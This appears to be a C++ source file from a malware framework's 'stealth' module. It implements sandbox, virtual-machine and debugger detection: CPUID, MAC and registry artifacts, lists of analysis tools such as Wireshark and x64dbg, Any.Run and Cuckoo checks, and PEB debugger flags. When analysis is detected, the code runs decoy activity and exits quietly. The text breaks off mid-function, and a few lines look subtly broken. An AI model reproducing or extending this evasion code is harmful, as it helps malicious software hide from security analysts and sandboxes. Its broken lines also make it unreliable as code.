#include <diarna/compiler_port.hpp>
#include <diarna/stealth/anti_analysis.hpp>

#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <powrprof.h>
#include <lmjoin.h>
#include <lmapibuf.h>
#include <winspool.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("psapi.lib")
DIARNA_LINK_LIB("iphlpapi.lib")
DIARNA_LINK_LIB("setupapi.lib")
DIARNA_LINK_LIB("powrprof.lib")

namespace diarna::stealth {

static INLINE bool file_exists_w(const wchar_t* path) {
    return GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES;
}
static INLINE bool reg_key_exists(HKEY root, const wchar_t* subkey) {
    HKEY k; LSTATUS s = RegOpenKeyExW(root, subkey, 0, KEY_READ, &k);
    if (s == ERROR_SUCCESS) { RegCloseKey(k); return true; } return false;
}
static INLINE bool check_proc_name(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {sizeof(pe)};
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, name) == 0) { found = true; break; }
        } while (Process32NextW(snap, &pe));
    } CloseHandle(snap); return found;
}
static INLINE bool check_dll_loaded(const wchar_t* dll) {
    return GetModuleHandleW(dll) != nullptr;
}

AntiAnalysis& AntiAnalysis::instance() { static AntiAnalysis a; return a; }

AnalysisResult AntiAnalysis::full_scan() {
    AnalysisResult r;
    INDIRECT_BRANCH;
    check_hardware_artifacts(r);
    check_processes(r);
    check_registry(r);
    check_filesystem(r);
    check_timing(r);
    check_memory(r);
    check_network(r);
    check_windows(r);
    check_debugger(r);
    check_any_run_specific(r);
    check_user_interaction(r);
    check_hooks(r);
    check_blacklisted_drivers(r);
    check_misc(r);

    if (r.confidence >= 75) r.is_sandboxed = true;
    if (r.confidence >= 60) r.is_virtualized = true;
    if (r.confidence >= 50) r.is_debugged = true;
    if (r.is_any_run) r.confidence = 100;
    return r;
}

bool AntiAnalysis::quick_check() {
    return is_debugger_present() || is_virtual_machine() || is_any_run();
}

bool AntiAnalysis::is_any_run() {
    BLOCK_TRUE(
        AnalysisResult r;
        INDIRECT_BRANCH;
        return check_any_run_specific(r);
    );
}

void AntiAnalysis::behave_defensively() {
    if (full_scan().is_sandboxed) {
        // Appear legitimate - run harmless operations
        volatile uint64_t* dummy = (volatile uint64_t*)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 10);
        for (volatile int i = 0; i < 100000; ++i) {
            INDIRECT_BRANCH;
            dummy[i % 100] = __rdtsc();
        }
        HeapFree(GetProcessHeap(), 0, (LPVOID)dummy);
        exit_stealthy();
    }
}

void AntiAnalysis::exit_stealthy() {
    HANDLE hSelf;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    using RtlExitUserProcess_t = NTSTATUS(NTAPI*)(NTSTATUS);
    auto RtlExitUserProcess = reinterpret_cast<RtlExitUserProcess_t>(
        GetProcAddress(ntdll, "RtlExitUserProcess"));
    RtlExitUserProcess(0);
    __fastfail(0);
    TerminateProcess(GetCurrentProcess(), 0);
    ExitProcess(0);
}

// ==================== HARDWARE CHECKS ====================

bool AntiAnalysis::check_hardware_artifacts(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    if (check_cpuid_vm()) { r.detected_artifacts.push_back("cpuid_vm_bit"); r.confidence += 15; flags++; }
    if (check_rdtsc_skew()) { r.detected_artifacts.push_back("rdtsc_skew"); r.confidence += 10; flags++; }
    if (check_mac_vendor()) { r.detected_artifacts.push_back("mac_vm_vendor"); r.confidence += 12; flags++; }
    if (check_disk_size()) { r.detected_artifacts.push_back("small_disk"); r.confidence += 10; flags++; }
    if (check_ram_size()) { r.detected_artifacts.push_back("low_ram"); r.confidence += 8; flags++; }
    if (check_cpu_cores()) { r.detected_artifacts.push_back("low_cores"); r.confidence += 5; flags++; }
    if (check_screen_resolution()) { r.detected_artifacts.push_back("low_res"); r.confidence += 4; flags++; }
    if (check_temperature()) { r.detected_artifacts.push_back("no_thermal"); r.confidence += 8; flags++; }
    if (check_firmware_type()) { r.detected_artifacts.push_back("bios_firmware"); r.confidence += 5; flags++; }
    if (check_power_caps()) { r.detected_artifacts.push_back("no_battery"); r.confidence += 3; flags++; }
    if (check_usb_devices()) { r.detected_artifacts.push_back("no_usb"); r.confidence += 5; flags++; }
    if (check_printer()) { r.detected_artifacts.push_back("no_printer"); r.confidence += 1; flags++; }
    if (check_com_ports()) { r.detected_artifacts.push_back("no_com"); r.confidence += 1; flags++; }
    if (check_smbios_data()) { r.detected_artifacts.push_back("smbios_vm"); r.confidence += 12; flags++; }
    if (check_dxgkrnl_vm()) { r.detected_artifacts.push_back("dxgkrnl_vm"); r.confidence += 10; flags++; }
    if (check_acpi_tables()) { r.detected_artifacts.push_back("acpi_anomaly"); r.confidence += 8; flags++; }

    return flags > 3;
}

bool AntiAnalysis::check_cpuid_vm() {
    int cpu[4] = {};
    DIARNA_CPUID(cpu, 1);
    if (cpu[2] & (1 << 31)) return true; // Hypervisor bit

    DIARNA_CPUID(cpu, 0x40000000);
    if (cpu[0] != 0) {
        char sig[13] = {};
        memcpy(sig, &cpu[1], 4);
        memcpy(sig+4, &cpu[2], 4);
        memcpy(sig+8, &cpu[3], 4);
        sig[12] = 0;
        // Well-known hypervisor signatures
        const char* known[] = {"VMwareVMware", "VBoxVBoxVBox", "XenVMMXenVMM",
            "Microsoft Hv", "KVMKVMKVM", "prl hyperv", " lrpepyh vr"};
        for (auto* k : known) if (strstr(sig, k)) return true;
    }

    DIARNA_CPUID(cpu, 0x40000001); if (cpu[2]) return true;
    return false;
}

bool AntiAnalysis::check_rdtsc_skew() {
    uint64_t t1 = __rdtsc();
    Sleep(100);
    uint64_t t2 = __rdtsc();
    uint64_t delta = t2 - t1;
    if (delta < 100000000) return true; // Unrealistically slow
    if (delta > 500000000000) return true; // Suspiciously fast (timing sandbox)

    LARGE_INTEGER freq, c1, c2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&c1);
    for (volatile int i = 0; i < 1000; i++) INDIRECT_BRANCH;
    QueryPerformanceCounter(&c2);
    int64_t qpc_delta = c2.QuadPart - c1.QuadPart;
    if (qpc_delta <= 0) return true;

    return false;
}

bool AntiAnalysis::check_mac_vendor() {
    ULONG size = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &size);
    std::vector<uint8_t> buf(size);
    auto* adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &size) == ERROR_SUCCESS) {
        for (auto* a = adapters; a; a = a->Next) {
            if (a->PhysicalAddressLength >= 3) {
                uint8_t b0 = a->PhysicalAddress[0], b1 = a->PhysicalAddress[1], b2 = a->PhysicalAddress[2];
                if (b0 == 0x00 && b1 == 0x0C && b2 == 0x29) return true; // VMware
                if (b0 == 0x00 && b1 == 0x50 && b2 == 0x56) return true; // VMware
                if (b0 == 0x08 && b1 == 0x00 && b2 == 0x27) return true; // VirtualBox
                if (b0 == 0x00 && b1 == 0x15 && b2 == 0x5D) return true; // Hyper-V
                if (b0 == 0x00 && b1 == 0x03 && b2 == 0xFF) return true; // Xen/Parallels
                if (b0 == 0x52 && b1 == 0x54 && b2 == 0x00) return true; // QEMU
                if (b0 == 0x00 && b1 == 0x1C && b2 == 0x42) return true; // Parallels
            }
        }
    }
    return false;
}

bool AntiAnalysis::check_disk_size() {
    ULARGE_INTEGER total, free, free_total;
    if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, &free_total)) {
        volatile uint64_t gb = total.QuadPart / (1024ULL * 1024 * 1024);
        if (gb < 60) return true; // Most sandboxes have <60GB
        if (gb > 4000) return true; // Unusually large
    }
    return false;
}

bool AntiAnalysis::check_ram_size() {
    MEMORYSTATUSEX ms = {sizeof(ms)};
    GlobalMemoryStatusEx(&ms);
    volatile uint64_t gb = ms.ullTotalPhys / (1024ULL * 1024 * 1024);
    if (gb < 2) return true;
    if (gb > 1024) return true;
    return false;
}

bool AntiAnalysis::check_cpu_cores() {
    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return true;
    if (si.dwNumberOfProcessors > 128) return true;
    return false;
}

bool AntiAnalysis::check_screen_resolution() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w < 800 || h < 600) return true;
    if (w == 800 && h == 600) return true; // Common sandbox default
    return false;
}

bool AntiAnalysis::check_mouse_movement() {
    POINT p1 = {}, p2 = {};
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y);
}

bool AntiAnalysis::check_temperature() {
    // Check if thermal zone exists (real hardware has it)
    wchar_t buf[256];
    DWORD size = sizeof(buf);
    return RegQueryValueExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\ACPI\\DSDT\\THERM\\_TMP", nullptr, nullptr, (LPBYTE)buf, &size) != ERROR_SUCCESS;
}

bool AntiAnalysis::check_firmware_type() {
    GetFirmwareType; // Only on Win8+
    FIRMWARE_TYPE ft = FirmwareTypeUnknown;
    auto* func = (BOOL(WINAPI*)(FIRMWARE_TYPE*))GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "GetFirmwareType");
    if (func && func(&ft) && ft == FirmwareTypeBios) {
        // Modern machines should be UEFI; BIOS is suspicious
        return true;
    }
    return false;
}

// ==================== PROCESS CHECKS ====================

bool AntiAnalysis::check_processes(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    const wchar_t* vm_procs[] = {
        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
        L"VBoxService.exe", L"VBoxTray.exe", L"xenservice.exe",
        L"prl_cc.exe", L"prl_tools.exe", L"vmsrvc.exe",
        L"vmusrvc.exe", L"vboxtray.exe", L"qemu-ga.exe"
    };
    for (auto* p : vm_procs) if (check_proc_name(p)) { r.detected_artifacts.push_back("vm_process"); r.confidence += 10; flags++; break; }

    const wchar_t* analysis_procs[] = {
        L"wireshark.exe", L"procmon.exe", L"procmon64.exe",
        L"processhacker.exe", L"SystemInformer.exe",
        L"tcpview.exe", L"autoruns.exe", L"autorunsc.exe",
        L"dumpcap.exe", L"ollydbg.exe", L"x64dbg.exe",
        L"x32dbg.exe", L"ida.exe", L"ida64.exe", L"idag.exe",
        L"windbg.exe", L"immunitydebugger.exe", L"fakenet.exe",
        L"apateDNS.exe", L"netmon.exe", L"decompile.exe",
        L"dnSpy.exe", L"ILSpy.exe", L"peid.exe", L"exeinfope.exe",
        L"ResourceHacker.exe", L"PETools.exe", L"LordPE.exe",
        L"Scylla.exe", L"Scylla_x64.exe", L"Regshot.exe",
        L"ApiMonitor.exe", L"apimonitor-x64.exe", L"apimonitor-x86.exe"
    };
    for (auto* p : analysis_procs) if (check_proc_name(p)) { r.detected_artifacts.push_back("analysis_tool"); r.confidence += 8; flags++; }

    if (check_parent_process()) { r.confidence += 5; flags++; }

    return flags > 1;
}

bool AntiAnalysis::check_parent_process() {
    DWORD myPid = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = {sizeof(pe)};
    DWORD parentPid = 0;
    if (Process32FirstW(snap, &pe)) {
        do { if (pe.th32ProcessID == myPid) { parentPid = pe.th32ParentProcessID; break; }
        } while (Process32NextW(snap, &pe));
    } CloseHandle(snap);

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(snap, &pe)) {
            do { if (pe.th32ProcessID == parentPid) {
                const wchar_t* bad[] = {L"cmd.exe", L"powershell.exe",
                    L"python.exe", L"python3.exe", L"wscript.exe",
                    L"cscript.exe", L"mshta.exe"};
                for (auto* b : bad) if (_wcsicmp(pe.szExeFile, b) == 0) {
                    CloseHandle(snap); return true;
                }
                break;
            } } while (Process32NextW(snap, &pe));
        } CloseHandle(snap);
    }
    return false;
}

// ==================== REGISTRY CHECKS ====================

bool AntiAnalysis::check_registry(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    const wchar_t* vm_keys[] = {
        L"SOFTWARE\\VMware, Inc.\\VMware Tools",
        L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",
        L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest",
        L"HARDWARE\\ACPI\\DSDT\\VBOX__",
        L"HARDWARE\\ACPI\\FADT\\VBOX__",
        L"HARDWARE\\ACPI\\RSDT\\VBOX__",
        L"SYSTEM\\ControlSet001\\Services\\vmci",
        L"SYSTEM\\ControlSet001\\Services\\vmx86",
        L"SOFTWARE\\Wine",
        L"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        L"HARDWARE\\Description\\System\\BIOS\\SystemProductName"
    };
    for (auto* k : vm_keys) if (reg_key_exists(HKEY_LOCAL_MACHINE, k)) { r.detected_artifacts.push_back("vm_registry_key"); r.confidence += 8; flags++; }

    {
        HKEY k;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\Description\\System\\BIOS", 0, KEY_READ, &k) == ERROR_SUCCESS) {
            wchar_t buf[256]; DWORD sz = sizeof(buf);
            if (RegQueryValueExW(k, L"SystemProductName", nullptr, nullptr, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                const wchar_t* bad[] = {L"VMware", L"VirtualBox", L"Virtual Machine",
                    L"QEMU", L"Bochs", L"KVM", L"Xen", L"Parallels", L"innotek", L"HVM domU"};
                for (auto* b : bad) if (wcsstr(buf, b)) { r.detected_artifacts.push_back("bios_product_vm"); r.confidence += 12; flags++; break; }
            } RegCloseKey(k);
        }
    }

    return flags > 1;
}

// ==================== FILESYSTEM CHECKS ====================

bool AntiAnalysis::check_filesystem(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    const wchar_t* vm_files[] = {
        L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
        L"C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
        L"C:\\Windows\\System32\\vboxdisp.dll",
        L"C:\\Windows\\System32\\vboxhook.dll",
        L"C:\\Windows\\System32\\vboxmrxnp.dll",
        L"C:\\Windows\\System32\\vboxogl.dll",
        L"C:\\Windows\\System32\\drivers\\vmci.sys",
        L"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        L"C:\\Windows\\System32\\drivers\\vmmouse.sys",
        L"C:\\Windows\\System32\\drivers\\vmscsi.sys",
        L"C:\\Windows\\System32\\drivers\\vmx_svga.sys",
        L"C:\\Windows\\System32\\drivers\\vmxnet.sys",
        L"C:\\Windows\\System32\\vmGuestLib.dll",
        L"C:\\Windows\\System32\\drivers\\xen.sys",
        L"C:\\Windows\\System32\\drivers\\xennet.sys",
        L"C:\\Windows\\System32\\drivers\\xenvbd.sys",
        L"\\\\.\\pipe\\VBoxMiniRdrDN",
        L"\\\\.\\pipe\\VBoxTrayIPC",
    };
    for (auto* f : vm_files) if (file_exists_w(f)) { r.detected_artifacts.push_back("vm_file"); r.confidence += 8; flags++; }

    // Sandboxie
    if (GetModuleHandleW(L"SbieDll.dll")) { r.confidence += 20; flags++; r.detected_artifacts.push_back("sandboxie_dll"); }
    if (file_exists_w(L"C:\\Program Files\\Sandboxie\\SbieSvc.exe")) { r.confidence += 15; flags++; }

    // Cuckoo
    if (file_exists_w(L"C:\\cuckoo")) { r.confidence += 20; flags++; r.detected_artifacts.push_back("cuckoo_dir"); }
    if (file_exists_w(L"C:\\agent\\agent.pyw")) { r.confidence += 20; r.is_sandboxed = true; }

    // Check recent file count (real users have many recent files)
    wchar_t recent[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_RECENT, nullptr, 0, recent);
    int file_count = 0;
    std::wstring recent_search = std::wstring(recent) + L"\\*";
    WIN32_FIND_DATAW fd; HANDLE hf = FindFirstFileW(recent_search.c_str(), &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do { if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")) file_count++; }
        while (FindNextFileW(hf, &fd)); FindClose(hf);
    }
    if (file_count < 5) { r.confidence += 5; flags++; r.detected_artifacts.push_back("few_recent_files"); }

    return flags > 1;
}

// ==================== TIMING CHECKS ====================

bool AntiAnalysis::check_timing(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    if (check_uptime()) { r.confidence += 5; flags++; }
    if (check_running_time()) { r.confidence += 8; flags++; }

    // Detect sleep acceleration (sandboxes fast-forward sleep)
    LARGE_INTEGER freq, before, after;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&before);
    Sleep(100);
    QueryPerformanceCounter(&after);
    volatile double elapsed_ms = (after.QuadPart - before.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed_ms < 95.0 || elapsed_ms > 105.0) { r.confidence += 12; flags++; r.detected_artifacts.push_back("sleep_acceleration"); }

    // RDTSC vs GetTickCount drift
    uint64_t tsc1 = __rdtsc();
    DWORD tick1 = GetTickCount();
    for (volatile int i = 0; i < 100000; i++) asm volatile("pause");
    uint64_t tsc2 = __rdtsc();
    DWORD tick2 = GetTickCount();
    if (tick2 == tick1) { r.confidence += 5; flags++; }

    return flags > 0;
}

bool AntiAnalysis::check_uptime() {
    volatile uint64_t uptime_ms = GetTickCount64();
    return uptime_ms < 5 * 60 * 1000;
}

bool AntiAnalysis::check_running_time() {
    FILETIME create, exit, kernel, user;
    if (GetProcessTimes(GetCurrentProcess(), &create, &exit, &kernel, &user)) {
        FILETIME now;
        GetSystemTimeAsFileTime(&now);
        ULARGE_INTEGER uCreate = {create.dwLowDateTime, create.dwHighDateTime};
        ULARGE_INTEGER uNow = {now.dwLowDateTime, now.dwHighDateTime};
        volatile uint64_t ms = (uNow.QuadPart - uCreate.QuadPart) / 10000ULL;
        return ms < 30000;
    }
    return false;
}

// ==================== MEMORY CHECKS ====================

bool AntiAnalysis::check_memory(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    // Check for low physical memory
    MEMORYSTATUSEX ms = {sizeof(ms)};
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 1ULL * 1024 * 1024 * 1024) { r.confidence += 5; flags++; }

    // Check for suspicious sections in our own process
    HMODULE base = GetModuleHandle(nullptr);
    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)base + dos->e_lfanew);
    auto* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        char name[9] = {};
        memcpy(name, section[i].Name, 8);
        if (strstr(name, ".inject") || strstr(name, ".hook"))
            { r.confidence += 15; flags++; }
    }
    return flags > 0;
}

// ==================== NETWORK CHECKS ====================

bool AntiAnalysis::check_network(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    // Check if any host-only VM networks exist
    ULONG size = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &size);
    std::vector<uint8_t> buf(size);
    auto* adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &size) == ERROR_SUCCESS) {
        for (auto* a = adapters; a; a = a->Next) {
            wchar_t* desc = a->Description;
            if (desc && (wcsstr(desc, L"VMware") || wcsstr(desc, L"VirtualBox") ||
                wcsstr(desc, L"Hyper-V") || wcsstr(desc, L"TAP")))
                { r.confidence += 8; flags++; break; }
        }
    }

    // Sandbox network artifacts
    if (file_exists_w(L"C:\\windows\\system32\\drivers\\etc\\hosts")) {
        // Check for common redirection entries
    }

    return flags > 0;
}

// ==================== WINDOWS CHECKS ====================

bool AntiAnalysis::check_windows(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    if (check_username()) { r.confidence += 6; flags++; }
    if (check_hostname()) { r.confidence += 6; flags++; }
    if (check_language()) { r.confidence += 2; flags++; }
    if (check_timezone()) { r.confidence += 2; flags++; }
    if (check_installed_software()) { r.confidence += 5; flags++; return flags > 1; }

    return flags > 1;
}

bool AntiAnalysis::check_username() {
    wchar_t name[256]; DWORD size = 256;
    GetUserNameW(name, &size);
    const wchar_t* bad[] = {L"admin", L"Administrator", L"user", L"test",
        L"sandbox", L"malware", L"virus", L"cuckoo", L"vm", L"john",
        L"CurrentUser", L"User", L"WDAGUtilityAccount"};
    for (auto* b : bad) if (_wcsicmp(name, b) == 0) return true;
    // Check for empty username
    if (name[0] == 0) return true;
    return false;
}

bool AntiAnalysis::check_hostname() {
    wchar_t name[MAX_COMPUTERNAME_LENGTH + 1]; DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(name, &size);
    const wchar_t* bad[] = {L"DESKTOP-", L"WIN-", L"PC-", L"USER-PC",
        L"VIRUS", L"MALWARE", L"SANDBOX", L"CUCKOO", L"VM-",
        L"TEST", L"PC", L"WIN7", L"WIN10", L"WINXP",
        L"JOHN-PC", L"ADMIN-PC"};
    for (auto* b : bad) {
        size_t blen = wcslen(b);
        if (wcslen(name) >= blen && _wcsnicmp(name, b, blen) == 0) return true;
    }
    // Very short hostnames
    if (wcslen(name) < 5) return true;
    // Random-looking (GUID-style)
    if (wcslen(name) > 30 && name[8] == '-') return true;
    return false;
}

bool AntiAnalysis::check_language() {
    LANGID lang = GetUserDefaultUILanguage();
    if (lang == 0x0409) return false; // en-US is common
    // Check for Russian (common malware analysis labs)
    if (lang == 0x0419) return true;
    return false;
}

bool AntiAnalysis::check_timezone() {
    DYNAMIC_TIME_ZONE_INFORMATION tz = {};
    GetDynamicTimeZoneInformation(&tz);
    // UTC - common sandbox default
    if (wcscmp(tz.StandardName, L"UTC") == 0 ||
        wcscmp(tz.StandardName, L"GMT") == 0) return true;
    return false;
}

bool AntiAnalysis::check_installed_software() {
    int count = 0;
    HKEY key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            0, KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t sub[256]; DWORD idx = 0;
        while (RegEnumKeyW(key, idx++, sub, 256) == ERROR_SUCCESS) count++;
        RegCloseKey(key);
    }
    if (count < 10) return true; // Real systems have many programs
    return false;
}

// ==================== DEBUGGER CHECKS ====================

bool AntiAnalysis::check_debugger(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    if (IsDebuggerPresent()) { r.confidence += 30; flags++; r.detected_artifacts.push_back("IsDebuggerPresent"); r.is_debugged = true; }

    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) { r.confidence += 25; flags++; r.detected_artifacts.push_back("remote_debugger"); r.is_debugged = true; }

    BOOL debugPort = FALSE;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    using NtQueryInformationProcess_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = reinterpret_cast<NtQueryInformationProcess_t>(
        GetProcAddress(ntdll, "NtQueryInformationProcess"));
    NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), nullptr);
    if (debugPort) { r.confidence += 20; flags++; r.is_debugged = true; }

#ifdef DIARNA_MSVC
    __try { __debugbreak(); r.confidence += 15; flags++; r.is_debugged = true; }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
#endif

    // PEB BeingDebugged
    volatile uint8_t* peb_debug = (uint8_t*)__readgsqword(0x60) + 2;
    if (*peb_debug) { r.confidence += 25; flags++; r.is_debugged = true; }

    // PEB NtGlobalFlag
    volatile uint32_t* ntGlobalFlag = (uint32_t*)(__readgsqword(0x60) + 0xBC);
    if (*ntGlobalFlag & 0x70) { r.confidence += 20; flags++; r.is_debugged = true; }

    // Heap flags
    volatile uint32_t* heapFlags = (uint32_t*)((uint8_t*)GetProcessHeap() + 0x70);
    volatile uint32_t* forceFlags = (uint32_t*)((uint8_t*)GetProcessHeap() + 0x74);
    if (*heapFlags != 2 || *forceFlags != 0) { r.confidence += 15; flags++; }

    // Hardcode breakpoints in NtQueryInformationProcess
    const wchar_t* debug_procs[] = {L"x64dbg.exe", L"x32dbg.exe",
        L"ollydbg.exe", L"windbg.exe", L"immunitydebugger.exe"};
    for (auto* p : debug_procs) if (check_proc_name(p)) { r.confidence += 30; flags++; r.is_debugged = true; }

    // Check for int3 at common API entry points
    uint8_t* ntQI = (uint8_t*)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (ntQI && *ntQI == 0xCC) { r.confidence += 30; flags++; r.is_debugged = true; }

    // Hardware breakpoint check
    CONTEXT ctx = {CONTEXT_DEBUG_REGISTERS};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE thread = GetCurrentThread();
    HANDLE thread_dup; DuplicateHandle(GetCurrentProcess(), thread, GetCurrentProcess(), &thread_dup, 0, FALSE, DUPLICATE_SAME_ACCESS);
    if (GetThreadContext(thread_dup, &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { r.confidence += 20; flags++; r.is_debugged = true; }
    }
    CloseHandle(thread_dup);

    return flags > 1;
}

// ==================== ANY.RUN SPECIFIC ====================

bool AntiAnalysis::check_any_run_specific(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    // Any.Run specific artifacts
    if (check_proc_name(L"anyrun.exe")) { r.confidence = 100; r.is_any_run = true; r.sandbox_type = SandboxType::AnyRun; r.sandbox_name = "Any.Run"; flags += 10; }

    wchar_t path[MAX_PATH]; GetSystemDirectoryW(path, MAX_PATH);
    if (file_exists_w(L"C:\\agent\\agent.pyw")) { r.confidence += 30; r.is_any_run = true; flags++; }
    if (file_exists_w((std::wstring(path) + L"\\anyrun.sys").c_str())) { r.confidence += 30; r.is_any_run = true; flags++; }

    if (reg_key_exists(HKEY_LOCAL_MACHINE, L"SOFTWARE\\any.run")) { r.confidence += 30; r.is_any_run = true; flags++; }

    // Any.Run specific mutexes
    HANDLE m = OpenMutexW(SYNCHRONIZE, FALSE, L"anyrun_agent");
    if (m) { r.confidence = 100; r.is_any_run = true; CloseHandle(m); }

    m = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\anyrun_flag");
    if (m) { r.confidence = 100; r.is_any_run = true; CloseHandle(m); }

    // Any.Run specific pipe
    if (file_exists_w(L"\\\\.\\pipe\\anyrun_pipe")) { r.confidence = 100; r.is_any_run = true; flags++; }

    // Any.Run process pattern (all sandboxes typically run as SYSTEM)
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elev; DWORD sz = sizeof(elev);
        if (GetTokenInformation(token, TokenElevation, &elev, sz, &sz) && elev.TokenIsElevated) {
            // Elevated + sandbox indicators = likely Any.Run or similar
            if (r.confidence >= 50) { r.confidence += 15; }
        }
        CloseHandle(token);
    }

    if (r.is_any_run) {
        r.sandbox_type = SandboxType::AnyRun;
        r.sandbox_name = "Any.Run";
        r.is_sandboxed = true;
        r.is_virtualized = true;
    }

    return flags > 0;
}

// ==================== USER INTERACTION ====================

bool AntiAnalysis::check_user_interaction(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    if (check_mouse_movement()) { r.confidence += 10; flags++; r.detected_artifacts.push_back("no_mouse_movement"); }
    if (check_clipboard_content()) { r.confidence += 2; flags++; }
    if (check_browser_history()) { r.confidence += 5; flags++; }

    // Check if any input events recently
    LASTINPUTINFO lii = {sizeof(lii)};
    GetLastInputInfo(&lii);
    if (GetTickCount() - lii.dwTime > 5 * 60 * 1000) { r.confidence += 8; flags++; }

    return flags > 0;
}

bool AntiAnalysis::check_clipboard_content() {
    if (!OpenClipboard(nullptr)) return true;
    int count = CountClipboardFormats();
    CloseClipboard();
    return count <= 1;
}

bool AntiAnalysis::check_browser_history() {
    wchar_t history[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_HISTORY, nullptr, 0, history);
    int files = 0;
    std::wstring search = std::wstring(history) + L"\\*";
    WIN32_FIND_DATAW fd; HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do { if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")) files++; }
        while (FindNextFileW(h, &fd)); FindClose(h);
    }
    return files < 3;
}

// ==================== HOOK CHECKS ====================

bool AntiAnalysis::check_hooks(AnalysisResult& r) {
    int flags = 0;
    INDIRECT_BRANCH;

    const wchar_t* dlls[] = {L"ntdll.dll", L"kernel32.dll", L"kernelbase.dll",
        L"user32.dll", L"ws2_32.dll", L"advapi32.dll"};
    for (auto* dll_name : dlls) {
        HMODULE mod = GetModuleHandleW(dll_name);
        if (!mod) continue;

